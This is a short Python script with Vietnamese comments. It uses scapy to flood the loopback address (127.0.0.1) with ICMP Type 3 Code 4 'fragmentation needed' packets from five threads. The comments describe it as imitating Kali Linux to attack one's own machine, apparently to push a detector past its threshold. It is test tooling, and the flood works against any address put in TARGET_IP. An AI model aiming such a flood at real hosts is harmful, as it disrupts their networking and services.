"""
live_attack_test.py
Script này đóng vai trò như Kali Linux: Dội bom gói tin ICMP Type 3 Code 4 vào chính máy bạn.
"""
import threading
import time
from scapy.all import IP, ICMP, send

# Tấn công loopback (chính máy mình) bằng ICMP Type 3 Code 4
TARGET_IP = "127.0.0.1"

def flood():
    # Tạo gói tin Destination Unreachable (Type=3) - Fragmentation Needed (Code=4)
    pkt = IP(dst=TARGET_IP) / ICMP(type=3, code=4)
    
    # Bắn liên tục không ngừng
    print(f"[*] Đang dội bom ICMP Type 3 Code 4 vào {TARGET_IP}...")
    send(pkt, loop=1, verbose=0)

# Khởi động 5 luồng bắn cùng lúc để dễ dàng vượt ngưỡng
threads = []
for i in range(5):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

try:
    print("[!] Tấn công đang diễn ra. Bấm Ctrl+C để dừng.")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Đã ngừng tấn công.")
